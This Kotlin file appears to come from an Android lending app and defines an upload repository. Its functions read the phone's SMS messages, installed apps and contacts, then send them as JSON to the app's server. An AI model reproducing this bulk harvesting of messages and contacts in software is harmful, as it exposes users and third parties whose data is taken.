package com.colombia.credit.module.upload

import com.bigdata.lib.ContactsHelper
import com.bigdata.lib.DevicesAppHelper
import com.bigdata.lib.MCLCManager
import com.bigdata.lib.SmsHelper
import com.colombia.credit.app.BaseRepository
import com.colombia.credit.app.getAppContext
import com.colombia.credit.bean.resp.RspCheckData
import com.colombia.credit.bean.resp.RspResult
import com.colombia.credit.manager.ContactHelper
import com.colombia.credit.net.DataApiService
import com.common.lib.net.ApiServiceLiveDataProxy
import com.common.lib.net.ResponseCode
import com.common.lib.net.bean.BaseResponse
import com.util.lib.GsonUtil
import io.reactivex.Flowable
import javax.inject.Inject

class UploadRepository @Inject constructor(private val dataApiService: DataApiService) : BaseRepository() {

    fun uploadInfo() =
        ApiServiceLiveDataProxy.request(Boolean::class.java) {
            Flowable.fromPublisher {
                val result = MCLCManager.synUpload()
                it.onNext(BaseResponse(ResponseCode.SUCCESS_CODE, result, null))
                it.onComplete()
            }
        }

    fun getInfo() = ApiServiceLiveDataProxy.request(RspCheckData::class.java) {
        dataApiService.checkData()
    }

    fun uploadsms()= ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val sms = SmsHelper.getMessage(getAppContext())
        dataApiService.uploadSms(createRequestBody(GsonUtil.toJson(sms).orEmpty()))
    }

    fun uploadApp()= ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val list = DevicesAppHelper.getAppList()
        dataApiService.uploadAppList(createRequestBody(GsonUtil.toJson(list).orEmpty()))
    }

    fun uploadCo() = ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val cons = ContactsHelper.getContacts(getAppContext())
        dataApiService.uploadCo(createRequestBody(GsonUtil.toJson(cons).orEmpty()))
    }
}